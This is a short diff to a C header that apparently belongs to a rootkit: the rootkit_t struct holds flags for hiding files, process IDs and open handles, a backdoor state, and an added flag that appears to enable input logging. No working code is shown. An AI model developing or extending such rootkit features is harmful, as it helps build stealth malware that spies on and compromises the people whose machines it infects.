@@ -15,6 +15,7 @@ typedef struct {
     bool hiding_files;
     bool hiding_pids;
     bool hiding_open;
+    bool logging_input;
     bd_state_t backdoor;
 } rootkit_t;
 
